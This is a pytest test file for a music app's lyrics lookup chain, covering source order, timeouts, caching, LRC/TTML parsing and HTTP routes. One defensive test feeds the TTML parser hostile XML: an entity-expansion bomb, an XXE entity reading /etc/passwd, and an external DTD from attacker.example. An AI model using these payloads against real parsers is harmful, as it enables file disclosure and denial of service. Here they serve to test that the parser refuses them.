"""The lyrics chain (production plan P1.3): source order, budgets, pauses, the extra sources' parsing, the text checks,
cache versions, and the offset / pin / search routes. Offline: sources and HTTP are faked."""
import json
import threading
import time

import pytest

import app
import lyrics
import lyrics_providers as P
import navidrome
import sources
import ytmusic
from sources import navidrome_src

YT_LYRICS = ytmusic.lyrics  # conftest swaps it for a no-network stub per test
VID = "dQw4w9WgXcQ"


def lrc(*texts, step=6.0, start=1.0):
    return "\n".join(f"{P.lrc_stamp(start + i * step)}{t}" for i, t in enumerate(texts))


SYNCED = lrc("one", "two", "three")
PLAIN = "one\ntwo\nthree"
WORDS = [[{"t": 1.0, "d": 0.5, "text": "one"}], [{"t": 7.0, "d": 0.5, "text": "two"}],
         [{"t": 13.0, "d": 0.4, "text": "th"}, {"t": 13.4, "text": "ree"}]]


def ans(synced=None, plain=None, instrumental=False, words=None):
    return {"synced": synced, "plain": plain, "instrumental": instrumental, "words": words}


@pytest.fixture(autouse=True)
def cache_file(tmp_path, monkeypatch):
    path = tmp_path / "lyrics.json"
    monkeypatch.setattr(lyrics.config, "LYRICS_FILE", path)
    monkeypatch.setattr(lyrics, "_cache", None)
    monkeypatch.setattr(lyrics, "_paused", {})
    return path


class Sources:
    """Fake fetchers: name -> answer (a dict, None, an exception to raise, or a callable(q))."""

    def __init__(self, monkeypatch, names, **answers):
        self.calls, self.answers = [], answers
        monkeypatch.setattr(lyrics, "order", lambda: list(names))
        for name in lyrics.PROVIDERS:
            monkeypatch.setitem(lyrics.FETCHERS, name, self._fetcher(name))

    def _fetcher(self, name):
        def fetch(q, timeout):
            self.calls.append(name)
            a = self.answers.get(name)
            if callable(a):
                a = a(q)
            if isinstance(a, Exception):
                raise a
            return a
        return fetch


def slow(secs, answer=None):
    def run(q):
        time.sleep(secs)
        return answer
    return run


# ---------- chain order, budgets, pauses ----------

def test_first_synced_ends_the_chain(monkeypatch):
    src = Sources(monkeypatch, ["lrclib", "simpmusic", "youtube"], lrclib=ans(SYNCED, PLAIN))
    found = lyrics.for_display(VID, "Song", "Artist")
    assert found == {"synced": SYNCED, "plain": PLAIN, "instrumental": False, "provider": "lrclib", "offset_ms": 0}
    assert src.calls == ["lrclib"]


def test_plain_is_only_the_fallback(monkeypatch):
    src = Sources(monkeypatch, ["lrclib", "simpmusic", "youtube"], lrclib=None, simpmusic=ans(None, PLAIN),
                  youtube=ans(SYNCED))
    assert lyrics.for_display(VID, "Song", "Artist")["provider"] == "youtube"
    assert src.calls == ["lrclib", "simpmusic", "youtube"]
    monkeypatch.setattr(lyrics, "_cache", None)
    src = Sources(monkeypatch, ["lrclib", "simpmusic", "youtube"], simpmusic=ans(None, PLAIN))
    found = lyrics.for_display("mc:1", "Song", "Artist")
    assert (found["provider"], found["plain"], found["synced"]) == ("simpmusic", PLAIN, None)
    assert src.calls == ["lrclib", "simpmusic", "youtube"]  # a plain answer doesn't end the chain


def test_order_is_the_setting(monkeypatch):
    src = Sources(monkeypatch, ["youtube", "lrclib"], lrclib=ans(SYNCED), youtube=ans(lrc("a", "b", "c")))
    assert lyrics.for_display(VID, "Song", "Artist")["provider"] == "youtube"
    assert src.calls == ["youtube"]
    assert lyrics.settings.SCHEMA["lyrics_providers"]["choices"] == list(lyrics.PROVIDERS)


def test_word_timed_source_beats_an_earlier_line_synced_one(monkeypatch):
    src = Sources(monkeypatch, ["lrclib", "youtube", "betterlyrics"], lrclib=ans(SYNCED, PLAIN),
                  betterlyrics=slow(0.2, ans(SYNCED, words=WORDS)))
    found = lyrics.for_display(VID, "Song", "Artist")
    assert found["provider"] == "betterlyrics" and found["words"] == WORDS
    assert sorted(src.calls) == ["betterlyrics", "lrclib"]  # started together; youtube never asked
    # A keep still gets LRCLIB's text (only LRCLIB is embedded).
    assert lyrics.for_track(VID, "Song", "Artist") == {"synced": SYNCED, "plain": PLAIN, "instrumental": False}


def test_word_wait_is_capped(monkeypatch):
    monkeypatch.setattr(lyrics, "WORD_WAIT", 0.2)
    Sources(monkeypatch, ["lrclib", "betterlyrics"], lrclib=ans(SYNCED), betterlyrics=slow(2, ans(SYNCED, words=WORDS)))
    t0 = time.monotonic()
    found = lyrics.for_display(VID, "Song", "Artist")
    assert found["provider"] == "lrclib" and time.monotonic() - t0 < 1
    assert "betterlyrics" not in lyrics._paused  # our wait ran out, not its time: no pause
    assert json.loads(lyrics.config.LYRICS_FILE.read_text())[VID]["retry"] is True  # asked again after a day


def test_line_synced_word_source_in_order_needs_no_extra_wait(monkeypatch):
    src = Sources(monkeypatch, ["betterlyrics", "lrclib"], betterlyrics=ans(SYNCED, words=WORDS), lrclib=ans(SYNCED))
    assert lyrics.for_display(VID, "Song", "Artist")["provider"] == "betterlyrics"
    assert src.calls == ["betterlyrics"]


def test_per_source_timeout_and_pause(monkeypatch):
    monkeypatch.setattr(lyrics, "PROVIDER_TIMEOUT", 0.2)
    src = Sources(monkeypatch, ["lrclib", "youtube"], lrclib=slow(1, ans(SYNCED)), youtube=ans(lrc("x", "y", "z")))
    t0 = time.monotonic()
    found = lyrics.for_display(VID, "Song", "Artist")
    assert found["provider"] == "youtube" and time.monotonic() - t0 < 0.8
    assert lyrics._paused["lrclib"] > time.monotonic() + lyrics.DOWN_S - 5
    # Paused: the next lookup (another track) skips it.
    lyrics.for_display("mc:2", "Song", "Artist")
    assert src.calls == ["lrclib", "youtube", "youtube"]


def test_total_budget(monkeypatch):
    monkeypatch.setattr(lyrics, "PROVIDER_TIMEOUT", 0.3)
    monkeypatch.setattr(lyrics, "BUDGET", 0.5)
    src = Sources(monkeypatch, ["lrclib", "simpmusic", "youtube"], lrclib=slow(1), simpmusic=slow(1), youtube=ans(SYNCED))
    t0 = time.monotonic()
    assert lyrics.for_display(VID, "Song", "Artist") is None
    assert time.monotonic() - t0 < 0.9
    assert "youtube" not in src.calls  # the budget ran out first
    assert not lyrics.config.LYRICS_FILE.exists()  # incomplete: not a miss


@pytest.mark.parametrize("status", [401, 403, 429])
def test_refusal_pauses_ten_minutes(monkeypatch, status):
    src = Sources(monkeypatch, ["simpmusic", "lrclib"], simpmusic=P.Blocked("SimpMusic", status), lrclib=ans(SYNCED))
    assert lyrics.for_display(VID, "Song", "Artist")["provider"] == "lrclib"
    assert lyrics._paused["simpmusic"] > time.monotonic() + lyrics.BLOCKED_S - 5
    lyrics.for_display("mc:3", "Song", "Artist")
    assert src.calls == ["simpmusic", "lrclib", "lrclib"]
    # The lookup that met the refusal wasn't complete: its hit is asked again after a day.
    assert json.loads(lyrics.config.LYRICS_FILE.read_text())[VID]["retry"] is True


def test_errors_are_not_cached_as_misses(monkeypatch, cache_file):
    Sources(monkeypatch, ["lrclib", "youtube"], lrclib=P.Unavailable("down"), youtube=None)
    assert lyrics.for_display(VID, "Song", "Artist") is None
    assert not cache_file.exists()
    assert lyrics._paused["lrclib"] > time.monotonic()


def test_clean_miss_is_cached_for_the_same_sources(monkeypatch, cache_file):
    src = Sources(monkeypatch, ["lrclib", "youtube"])
    assert lyrics.for_display(VID, "Song", "Artist") is None
    entry = json.loads(cache_file.read_text())[VID]
    assert entry["miss"] and entry["v"] == lyrics.VERSION and entry["sig"] == "lrclib,youtube"
    lyrics.for_display(VID, "Song", "Artist")
    assert src.calls == ["lrclib", "youtube"]  # served from the cache
    # Another source turned on: the miss no longer counts.
    src = Sources(monkeypatch, ["lrclib", "youtube", "betterlyrics"], betterlyrics=ans(SYNCED, words=WORDS))
    assert lyrics.for_display(VID, "Song", "Artist")["provider"] == "betterlyrics"


def test_one_lookup_per_track(monkeypatch):
    src = Sources(monkeypatch, ["lrclib"], lrclib=slow(0.2, ans(SYNCED)))
    out = []
    threads = [threading.Thread(target=lambda: out.append(lyrics.for_display(VID, "Song", "Artist"))) for _ in range(3)]
    for t in threads:
        t.start()
    for t in threads:
        t.join()
    assert src.calls == ["lrclib"] and all(o["synced"] == SYNCED for o in out)


def test_youtube_only_lyrics_are_not_embedded(monkeypatch):
    Sources(monkeypatch, ["lrclib", "youtube"], youtube=ans(SYNCED))
    assert lyrics.for_display(VID, "Song", "Artist")["provider"] == "youtube"
    assert lyrics.for_track(VID, "Song", "Artist") is None


def test_video_id_only_for_youtube_ids(monkeypatch):
    seen = []
    Sources(monkeypatch, ["simpmusic"], simpmusic=lambda q: seen.append(q["video_id"]))
    lyrics.for_display(VID, "Song", "Artist", "Album", "213.4")
    lyrics.for_display("mc:12", "Song", "Artist")
    assert seen == [VID, None]


# ---------- cache versions ----------

def _seed(cache_file, entries):
    cache_file.write_text(json.dumps(entries))
    lyrics._cache = None


def test_reef1_entries(monkeypatch, cache_file):
    now = time.time()
    _seed(cache_file, {
        "a" * 11: {"synced": SYNCED, "plain": None, "instrumental": False, "at": now},  # LRCLIB synced: stands
        "b" * 11: {"synced": None, "plain": PLAIN, "instrumental": False, "at": now},   # plain: asked again
        "c" * 11: {"miss": True, "at": now},                                              # miss: asked again
    })
    src = Sources(monkeypatch, ["lrclib", "youtube"], youtube=ans(lrc("x", "y", "z")))
    assert lyrics.for_display("a" * 11, "S", "A") == {"synced": SYNCED, "plain": None, "instrumental": False,
                                                       "provider": "lrclib", "offset_ms": 0}
    assert lyrics.for_track("a" * 11, "S", "A")["synced"] == SYNCED
    assert src.calls == []
    assert lyrics.for_display("b" * 11, "S", "A")["provider"] == "youtube"
    assert lyrics.for_display("c" * 11, "S", "A")["provider"] == "youtube"
    assert src.calls == ["lrclib", "youtube"] * 2


def test_stale_retry_hit_is_kept_when_the_refresh_fails(monkeypatch, cache_file):
    old = time.time() - 2 * 86400
    _seed(cache_file, {VID: {"v": 2, "provider": "youtube", "synced": None, "plain": PLAIN, "instrumental": False,
                             "retry": True, "at": old, "offset_ms": 300}})
    src = Sources(monkeypatch, ["lrclib", "youtube"], lrclib=P.Unavailable("down"))
    assert lyrics.for_display(VID, "S", "A")["plain"] == PLAIN
    assert src.calls == ["lrclib", "youtube"]
    monkeypatch.setattr(lyrics, "_paused", {})
    Sources(monkeypatch, ["lrclib", "youtube"], lrclib=ans(SYNCED))
    found = lyrics.for_display(VID, "S", "A")
    assert (found["provider"], found["offset_ms"]) == ("lrclib", 300)  # the offset survives a new lookup


def test_words_are_stored_compactly(monkeypatch, cache_file):
    Sources(monkeypatch, ["betterlyrics"], betterlyrics=ans(SYNCED, words=WORDS))
    lyrics.for_display(VID, "S", "A")
    stored = json.loads(cache_file.read_text())[VID]["words"]
    assert stored[2] == [[13000, 400, "th"], [13400, None, "ree"]]
    lyrics._cache = None
    assert lyrics.for_display(VID, "S", "A")["words"] == WORDS


# ---------- text checks ----------

def test_short_span_is_not_synced():
    found = P.result(lrc("a", "b", "c", step=2), None)
    assert found["synced"] is None and found["plain"] == "a\nb\nc"


def test_first_line_after_the_track_is_not_synced():
    late = lrc("a", "b", "c", start=300)
    assert P.result(late, None, duration=280)["synced"] is None
    assert P.result(late, None, duration=295)["synced"] == late  # within duration + 10 s
    assert P.result(late, None)["synced"] == late  # unknown length: can't tell


def test_credit_lines_are_dropped_at_the_edges_only():
    text = "\n".join(["[00:00.00] Lyrics by Someone", "[00:01.00]Synced by X", "[00:05.00] one",
                      "[00:09.00] Written by the river", "[00:14.00] two", "[00:20.00] three",
                      "[00:25.00]Lyrics from LyricFind"])
    out = P.result(text, "Composed by Y\nline a\nline b\nline c")
    assert out["synced"].splitlines() == ["[00:05.00] one", "[00:09.00] Written by the river", "[00:14.00] two",
                                          "[00:20.00] three"]
    assert out["plain"] == "line a\nline b\nline c"


def test_colon_centiseconds_are_fixed():
    out = P.result("[00:01:50]a\n[00:08:20]b\n[00:15:00]c", None)
    assert out["synced"] == "[00:01.50]a\n[00:08.20]b\n[00:15.00]c"


def test_thin_text_is_junk():
    assert P.result("[00:00.00]probe", "probe") is None
    assert P.result(None, None, instrumental=True) == ans(instrumental=True)


def test_words_must_line_up():
    assert P.result(SYNCED, None, words=WORDS[:2])["words"] is None
    assert P.result(SYNCED, None, words=[[{"t": 1.0, "text": "one"}]] * 3)["words"] is None  # line timing only


def test_enhanced_lrc_words():
    text = "[00:01.00]<00:01.00>Hey <00:01.50>you\n[00:08.00]<00:08.00>la\n[00:15.00]end"
    assert P.words_from_lrc(text) == [[{"t": 1.0, "d": 0.5, "text": "Hey "}, {"t": 1.5, "text": "you"}],
                                      [{"t": 8.0, "text": "la"}], [{"t": 15.0, "text": "end"}]]
    assert P.words_from_lrc(SYNCED) is None


# ---------- HTTP fakes for the real fetchers ----------

class _R:
    def __init__(self, status, body=None, text=None):
        self.status_code, self.body = status, body
        self.text = text if text is not None else json.dumps(body)

    def json(self):
        if isinstance(self.body, Exception):
            raise self.body
        return self.body


class _Session:
    def __init__(self, *responses):
        self.responses, self.calls = list(responses), []

    def get(self, url, params=None, headers=None, timeout=None):
        self.calls.append((url, params, timeout))
        r = self.responses.pop(0) if len(self.responses) > 1 else self.responses[0]
        if isinstance(r, Exception):
            raise r
        return r


Q = {"video_id": VID, "title": "Never Gonna Give You Up", "artist": "Rick Astley", "album": None, "duration": 213.0}


# ---------- SimpMusic ----------

@pytest.mark.parametrize("body", [
    {"success": True, "data": [{"videoId": VID, "syncedLyrics": SYNCED, "plainLyric": PLAIN}]},
    [{"videoId": VID, "syncedLyrics": SYNCED, "plainLyric": PLAIN}],
    {"data": {"syncedLyrics": SYNCED, "plainLyric": PLAIN}},
])
def test_simpmusic_shapes(monkeypatch, body):
    s = _Session(_R(200, body))
    monkeypatch.setattr(P, "_session", s)
    assert P.simpmusic(Q, 8) == ans(SYNCED, PLAIN)
    assert s.calls[0][0] == P.SIMPMUSIC + VID and s.calls[0][2] == 8


def test_simpmusic_prefers_word_timed_then_synced_then_votes(monkeypatch):
    rich = "[00:01.00]<00:01.00>one <00:01.40>two\n[00:08.00]<00:08.00>three\n[00:15.00]<00:15.00>four"
    monkeypatch.setattr(P, "_session", _Session(_R(200, {"data": [
        {"plainLyric": PLAIN, "vote": 9},
        {"syncedLyrics": lrc("low", "votes", "here"), "vote": 1},
        {"syncedLyrics": SYNCED, "vote": 5},
    ]})))
    assert P.simpmusic(Q, 8)["synced"] == SYNCED
    monkeypatch.setattr(P, "_session", _Session(_R(200, {"data": [{"syncedLyrics": SYNCED, "vote": 5},
                                                                   {"richSyncLyrics": rich}]})))
    found = P.simpmusic(Q, 8)
    assert found["words"][0] == [{"t": 1.0, "d": 0.4, "text": "one "}, {"t": 1.4, "text": "two"}]
    assert found["synced"] == rich


def test_simpmusic_none_and_errors(monkeypatch):
    assert P.simpmusic({**Q, "video_id": None}, 8) is None
    for r, expect in [(_R(404, {"error": "not found"}), None), (_R(200, {"data": []}), None),
                      (_R(200, {"data": [{"plainLyric": "x"}]}), None)]:
        monkeypatch.setattr(P, "_session", _Session(r))
        assert P.simpmusic(Q, 8) is expect
    for status in (401, 403, 429):
        monkeypatch.setattr(P, "_session", _Session(_R(status, {"success": False})))
        with pytest.raises(P.Blocked):
            P.simpmusic(Q, 8)
    monkeypatch.setattr(P, "_session", _Session(_R(502, {})))
    with pytest.raises(P.Unavailable):
        P.simpmusic(Q, 8)
    monkeypatch.setattr(P, "_session", _Session(_R(200, ValueError("html"), text="<html>")))
    with pytest.raises(P.Unavailable):
        P.simpmusic(Q, 8)


# ---------- YouTube Music ----------

class _Line:
    def __init__(self, text, start):
        self.text, self.start_time, self.end_time, self.id = text, start, start + 1000, 1


def _yt(monkeypatch, watch, found=None, error=None):
    calls = []

    def call(method, *args, **kwargs):
        calls.append((method, args, kwargs))
        if error:
            raise error
        return watch if method == "get_watch_playlist" else found

    monkeypatch.setattr(ytmusic, "lyrics", YT_LYRICS)
    monkeypatch.setattr(ytmusic, "_call", call)
    monkeypatch.setattr(ytmusic, "enabled", lambda: True)
    return calls


def test_youtube_timed(monkeypatch):
    calls = _yt(monkeypatch, {"lyrics": "MPLYt_x"}, {"hasTimestamps": True, "source": "Source: LyricFind",
                                                     "lyrics": [_Line("one", 1000), _Line("two", 7000),
                                                                _Line("three", 13500)]})
    found = P.youtube(Q, 8)
    assert found["synced"] == "[00:01.00]one\n[00:07.00]two\n[00:13.50]three"
    assert calls[1] == ("get_lyrics", ("MPLYt_x",), {"timestamps": True})


def test_youtube_plain_and_none(monkeypatch):
    _yt(monkeypatch, {"lyrics": "MPLYt_x"}, {"hasTimestamps": False, "lyrics": PLAIN, "source": "Source: X"})
    assert P.youtube(Q, 8) == ans(None, PLAIN)
    _yt(monkeypatch, {"lyrics": None, "tracks": []})
    assert P.youtube(Q, 8) is None
    assert P.youtube({**Q, "video_id": None}, 8) is None
    monkeypatch.setattr(ytmusic, "enabled", lambda: False)
    assert P.youtube(Q, 8) is None


def test_youtube_errors(monkeypatch):
    _yt(monkeypatch, None, error=Exception("Server returned HTTP 429: Too Many Requests."))
    with pytest.raises(P.Blocked):
        P.youtube(Q, 8)
    for err in (lyrics.requests.ReadTimeout("Read timed out"), Exception("Server returned HTTP 503: Service Unavailable")):
        _yt(monkeypatch, None, error=err)
        with pytest.raises(P.Unavailable):
            P.youtube(Q, 8)
    # An unknown video (or a page ytmusicapi can't read) is "no lyrics", not an outage.
    for err in (Exception("No content returned by the server."), KeyError("contents")):
        _yt(monkeypatch, None, error=err)
        assert P.youtube(Q, 8) is None


# ---------- BetterLyrics / TTML ----------

TTML = """<tt xmlns="http://www.w3.org/ns/ttml" xmlns:ttm="http://www.w3.org/ns/ttml#metadata"
 xmlns:itunes="http://music.apple.com/lyric-ttml-internal" itunes:timing="Word"><head><metadata>
 <ttm:agent type="person" xml:id="v1"/></metadata></head><body dur="3:33.107"><div begin="1.0" end="30">
<p begin="1.000" end="3.0" ttm:agent="v1"><span begin="1.000" end="1.400">We're</span> <span begin="1.4" end="2.0">no</span> <span begin="2.0" end="3.0">strangers</span></p>
<p begin="0:07.5" end="0:10"><span begin="7.5" end="8.0">mirándo</span><span begin="8.0" end="8.6">te</span> <span ttm:role="x-bg"><span begin="9.0" end="9.5">(DY)</span></span></p>
<p begin="14s" end="16s"><span begin="14000ms" end="15s">You</span> <span begin="15s" end="16s">know</span></p>
</div></body></tt>"""


def test_ttml_words():
    lines, dur, plain = P.parse_ttml(TTML)
    assert round(dur, 3) == 213.107
    assert [(t, text) for t, text, _ in lines] == [(1.0, "We're no strangers"), (7.5, "mirándote (DY)"), (14.0, "You know")]
    assert lines[1][2] == [{"t": 7.5, "d": 0.5, "text": "mirándo"}, {"t": 8.0, "d": 0.6, "text": "te "},
                           {"t": 9.0, "d": 0.5, "text": "(DY)"}]
    assert plain == "We're no strangers\nmirándote (DY)\nYou know"


def test_ttml_line_timed_and_untimed():
    line = TTML.replace('itunes:timing="Word"', 'itunes:timing="Line"')
    line = line.replace("<span begin", "<span x").replace('<span ttm:role="x-bg">', "<span>")
    lines, _, _ = P.parse_ttml(line)
    assert [w for _, _, w in lines] == [[], [], []] and lines[0][1] == "We're no strangers"
    untimed = '<tt xmlns="http://www.w3.org/ns/ttml"><body><div><p>a</p><p>b</p><p>c</p></div></body></tt>'
    assert P.parse_ttml(untimed) == ([], None, "a\nb\nc")


@pytest.mark.parametrize("payload", [
    '<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;&lol;&lol;">]>'
    '<tt xmlns="http://www.w3.org/ns/ttml"><body><div><p begin="1">&lol2;</p></div></body></tt>',
    '<?xml version="1.0"?><!DOCTYPE tt [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
    '<tt xmlns="http://www.w3.org/ns/ttml"><body><div><p begin="1">&xxe;</p></div></body></tt>',
    '<!doctype tt SYSTEM "http://attacker.example/x.dtd"><tt xmlns="http://www.w3.org/ns/ttml"/>',
    '<tt xmlns="http://www.w3.org/ns/ttml"><body><div><p begin="1">&undeclared;</p></div></body></tt>',
])
def test_ttml_refuses_entities(monkeypatch, payload):
    with pytest.raises(ValueError):
        P.parse_ttml(payload)
    monkeypatch.setattr(P, "_session", _Session(_R(200, {"ttml": payload})))
    assert P.betterlyrics(Q, 8) is None  # skipped with a warning, never parsed


def test_betterlyrics_hit(monkeypatch):
    s = _Session(_R(200, {"ttml": TTML}))
    monkeypatch.setattr(P, "_session", s)
    found = P.betterlyrics({**Q, "album": "Whenever"}, 8)
    assert found["synced"] == "[00:01.00]We're no strangers\n[00:07.50]mirándote (DY)\n[00:14.00]You know"
    assert len(found["words"]) == 3 and found["words"][2][0] == {"t": 14.0, "d": 1.0, "text": "You "}
    assert s.calls[0][1] == {"s": Q["title"], "a": "Rick Astley", "al": "Whenever", "d": 213}


def test_betterlyrics_uncached_is_no_lyrics(monkeypatch):
    body = {"error": "API key required", "message": "Uncached queries require a valid API key via X-API-Key header"}
    monkeypatch.setattr(P, "_session", _Session(_R(401, body)))
    assert P.betterlyrics(Q, 8) is None
    monkeypatch.setattr(P, "_session", _Session(_R(401, {"error": "Unauthorized"})))
    with pytest.raises(P.Blocked):
        P.betterlyrics(Q, 8)
    monkeypatch.setattr(P, "_session", _Session(_R(429, {})))
    with pytest.raises(P.Blocked):
        P.betterlyrics(Q, 8)


def test_betterlyrics_other_recording(monkeypatch):
    monkeypatch.setattr(P, "_session", _Session(_R(200, {"ttml": TTML})))
    assert P.betterlyrics({**Q, "duration": 240.0}, 8) is None  # 213 s vs 240 s
    assert P.betterlyrics({**Q, "duration": None}, 8)["words"]
    assert P.betterlyrics({**Q, "title": ""}, 8) is None


def test_uncached_doesnt_pause_in_the_chain(monkeypatch):
    body = {"error": "API key required", "message": "Uncached queries require a valid API key"}
    monkeypatch.setattr(P, "_session", _Session(_R(401, body)))
    monkeypatch.setattr(lyrics, "order", lambda: ["betterlyrics"])
    assert lyrics.for_display(VID, "Song", "Artist") is None
    assert "betterlyrics" not in lyrics._paused
    assert json.loads(lyrics.config.LYRICS_FILE.read_text())[VID]["miss"] is True


# ---------- routes: offset, pin, search ----------

@pytest.fixture
def client():
    return app.app.test_client()


class _Lrclib:
    def __init__(self, records=None, results=None, error=None):
        self.records, self.results, self.error, self.calls = records or {}, results or [], error, []

    def get(self, url, params=None, headers=None, timeout=None):
        self.calls.append((url.split("/api", 1)[1], params))
        if self.error:
            raise self.error
        if "/get/" in url:
            rec = self.records.get(int(url.rsplit("/", 1)[1]))
            return _R(200, rec) if rec else _R(404, {"code": 404})
        return _R(200, self.results)


def _rec(rid, synced=SYNCED, plain=PLAIN, **kw):
    return {"id": rid, "trackName": kw.get("track", "Song"), "artistName": kw.get("artist", "Artist"),
            "albumName": "LP", "duration": kw.get("duration", 200.0), "instrumental": False,
            "syncedLyrics": synced, "plainLyrics": plain}


def test_offset_round_trip(client, monkeypatch):
    Sources(monkeypatch, ["lrclib"], lrclib=ans(SYNCED))
    assert client.put(f"/api/lyrics/{VID}/offset", json={"ms": -1500}).get_json() == {"offset_ms": -1500}
    r = client.get(f"/api/lyrics/{VID}", query_string={"title": "Song", "artist": "Artist"})
    assert r.get_json()["offset_ms"] == -1500 and r.get_json()["provider"] == "lrclib"
    assert client.put(f"/api/lyrics/{VID}/offset", json={"ms": 0}).get_json() == {"offset_ms": 0}
    assert client.get(f"/api/lyrics/{VID}?title=Song").get_json()["offset_ms"] == 0
    for bad in ({"ms": 10001}, {"ms": -20000}, {"ms": True}, {"ms": "5"}, {}, None):
        assert client.put(f"/api/lyrics/{VID}/offset", json=bad).status_code == 400
    assert client.put("/api/lyrics/short/offset", json={"ms": 1}).status_code == 404


def test_offset_before_any_lookup_and_on_library_lyrics(client, monkeypatch):
    monkeypatch.setitem(sources.SOURCES, "nd", navidrome_src.SOURCE)
    monkeypatch.setattr(navidrome, "lyrics", lambda sid: {"synced": SYNCED, "plain": None, "instrumental": False})
    Sources(monkeypatch, [])
    client.put("/api/lyrics/nd:abc/offset", json={"ms": 500})
    assert client.get("/api/lyrics/nd:abc?title=S").get_json() == {
        "synced": SYNCED, "plain": None, "instrumental": False, "provider": "navidrome", "offset_ms": 500}
    # An offset-only entry isn't a hit: the lookup still runs and keeps the offset.
    client.put("/api/lyrics/mc:5/offset", json={"ms": 250})
    Sources(monkeypatch, ["lrclib"], lrclib=ans(SYNCED))
    assert client.get("/api/lyrics/mc:5?title=S").get_json()["offset_ms"] == 250


def test_pin_wins_and_is_never_overwritten(client, monkeypatch, cache_file):
    fake = _Lrclib(records={42: _rec(42, synced=lrc("pinned", "lyrics", "here"))})
    monkeypatch.setattr(lyrics, "_session", fake)
    src = Sources(monkeypatch, ["lrclib", "betterlyrics"], lrclib=ans(SYNCED), betterlyrics=ans(SYNCED, words=WORDS))
    assert client.get(f"/api/lyrics/{VID}?title=Song").get_json()["provider"] == "betterlyrics"
    client.put(f"/api/lyrics/{VID}/offset", json={"ms": 700})
    r = client.put(f"/api/lyrics/{VID}/pin", json={"lrclib_id": 42})
    assert r.status_code == 200
    body = r.get_json()
    assert body["provider"] == "lrclib-pinned" and body["synced"].startswith("[00:01.00]pinned")
    assert body["offset_ms"] == 0 and "words" not in body  # timing starts over with the new lyrics
    assert fake.calls == [("/get/42", None)]
    calls = len(src.calls)
    # Even a stale entry: automatic lookups never replace a pin.
    entries = json.loads(cache_file.read_text())
    entries[VID]["at"] = 0
    _seed(cache_file, entries)
    assert client.get(f"/api/lyrics/{VID}?title=Song").get_json()["provider"] == "lrclib-pinned"
    assert lyrics.for_track(VID, "Song", "A")["synced"].startswith("[00:01.00]pinned")  # a keep embeds it
    assert len(src.calls) == calls
    client.put(f"/api/lyrics/{VID}/offset", json={"ms": -200})
    assert client.get(f"/api/lyrics/{VID}?title=Song").get_json()["offset_ms"] == -200
    # Unpin: asked again.
    assert client.delete(f"/api/lyrics/{VID}/pin").status_code == 204
    assert client.delete(f"/api/lyrics/{VID}/pin").status_code == 404
    found = client.get(f"/api/lyrics/{VID}?title=Song").get_json()
    assert found["provider"] == "betterlyrics" and found["offset_ms"] == -200


def test_pin_beats_library_tags(client, monkeypatch):
    monkeypatch.setitem(sources.SOURCES, "nd", navidrome_src.SOURCE)
    monkeypatch.setattr(navidrome, "lyrics", lambda sid: pytest.fail("pinned lyrics win over the tags"))
    monkeypatch.setattr(lyrics, "_session", _Lrclib(records={7: _rec(7)}))
    assert client.put("/api/lyrics/nd:abc/pin", json={"lrclib_id": 7}).status_code == 200
    assert client.get("/api/lyrics/nd:abc").get_json()["provider"] == "lrclib-pinned"


def test_pin_errors(client, monkeypatch):
    monkeypatch.setattr(lyrics, "_session", _Lrclib(records={8: _rec(8, synced=None, plain="junk")}))
    for bad in ({"lrclib_id": "42"}, {"lrclib_id": True}, {"lrclib_id": 0}, {}, None):
        assert client.put(f"/api/lyrics/{VID}/pin", json=bad).status_code == 400
    assert client.put(f"/api/lyrics/{VID}/pin", json={"lrclib_id": 9}).status_code == 404  # no such record
    assert client.put(f"/api/lyrics/{VID}/pin", json={"lrclib_id": 8}).status_code == 404  # no real lyrics
    monkeypatch.setattr(lyrics, "_session", _Lrclib(error=lyrics.requests.ConnectionError("down")))
    assert client.put(f"/api/lyrics/{VID}/pin", json={"lrclib_id": 8}).status_code == 502


def test_search_shapes_and_ranks(client, monkeypatch):
    fake = _Lrclib(results=[
        _rec(1, track="Song (Live)", artist="Artist", duration=260.0),
        _rec(2, synced=None, track="Song", artist="Artist", duration=200.0),
        _rec(3, synced="[00:00.00]probe", plain="probe"),  # junk: left out
        _rec(4, track="Other", artist="Someone", duration=100.0),
        "not a record",
    ])
    monkeypatch.setattr(lyrics, "_session", fake)
    r = client.get("/api/lyrics/search", query_string={"q": "song artist"})
    assert r.status_code == 200
    body = r.get_json()
    assert body["q"] == "song artist" and [x["id"] for x in body["results"]] == [1, 2, 4]
    assert body["results"][1] == {"id": 2, "track": "Song", "artist": "Artist", "album": "LP", "duration": 200.0,
                                  "synced": False, "plain": True, "instrumental": False}
    assert fake.calls[-1] == ("/search", {"q": "song artist"})
    # With the track's hints (and no q): searched by title + artist, the closest match first.
    body = client.get("/api/lyrics/search", query_string={"title": "Song (feat. X)", "artist": "Artist, B",
                                                          "duration": "200"}).get_json()
    assert body["q"] == "Song Artist" and [x["id"] for x in body["results"]][0] == 2
    assert all("score" in x for x in body["results"])


def test_search_errors(client, monkeypatch):
    assert client.get("/api/lyrics/search").status_code == 400
    monkeypatch.setattr(lyrics, "_session", _Lrclib(error=lyrics.requests.Timeout("slow")))
    assert client.get("/api/lyrics/search?q=x").status_code == 502
